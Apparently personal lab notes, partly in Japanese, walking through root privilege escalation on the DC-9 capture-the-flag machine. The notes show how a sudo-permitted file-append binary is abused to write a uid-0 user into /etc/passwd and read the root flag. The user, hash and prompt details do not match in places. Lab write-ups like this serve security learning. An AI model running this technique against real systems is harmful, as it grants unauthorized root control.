└─# ssh chandlerb@192.168.11.24

The authenticity of host '192.168.11.24 (192.168.11.24)' can't be established.

ED25519 key fingerprint is SHA256:QqKiAU3zrowiN9K1SVvmSWvLBZAqdSpT0aMLTwGlyvo.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/\[fingerprint\])? yes

Warning: Permanently added '192.168.11.24' (ED25519) to the list of known hosts.

chandlerb@192.168.11.24's password:

Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.

![[Privilege Escalation image.png]]

fredf@dc-9:~$ sudo -l

Matching Defaults entries for fredf on dc-9:

env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:

(root) NOPASSWD: /opt/devstuff/dist/test/test

fredf@dc-9:~$ file /opt/devstuff/dist/test/test

/opt/devstuff/dist/test/test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID\[sha1\]=28ba79c778f7402713aec6af319ee0fbaf3a8014, stripped

fredf@dc-9:~$

![[Privilege Escalation image 1.png]]

実行ファイル周辺の調査

fredf@dc-9:/opt/devstuff/dist/test$ ls ..

test

fredf@dc-9:/opt/devstuff/dist/test$ ls ../../

build  dist  __pycache__  test.py  test.spec

fredf@dc-9:/opt/devstuff/dist/test$ cat ../../test.py

#!/usr/bin/python

import sys

if len (sys.argv) != 3 :

print ("Usage: python test.py read append")

sys.exit (1)

else :

f = open(sys.argv\[1\], "r")

output = (f.read())

f = open(sys.argv\[2\], "a")

f.write(output)

f.close()

![[Privilege Escalation image 2.png]]

パスワードの作成

fredf@dc-9:/opt/devstuff/dist/test$ openssl passwd -1

Password:

Verifying - Password:

$1$ds80.DZg$jl4M25k1jrDtHPnzrqya5/

![[Privilege Escalation image 3.png]]

fredf@dc-9:~$ vi user.txt

![[Privilege Escalation image 4.png]]

test2:$1$pAj.8eR7$cRecpb8Nep7sTNDVOLy8y/:0:0:test2:/home/USER:/bin/bash

![[Privilege Escalation image 5.png]]

fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test user.txt /etc/passwd

fredf@dc-9:~$ cat /etc/passwd

test2:$1$pAj.8eR7$cRecpb8Nep7sTNDVOLy8y/:0:0:test2:/home/USER:/bin/bash

![[Privilege Escalation image 6.png]]

fredf@dc-9:~$ su test2

Password:

root@dc-9:/home/fredf# cd /root

root@dc-9:/root# ls

theflag.txt

root@dc-9:/root# cat theflag.txt

███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗

████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║

██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║

██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝

██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗

╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝

Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those

who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever

challenge in the DC series.

So long, and thanks for all the fish.

![[Privilege Escalation image 7.png]]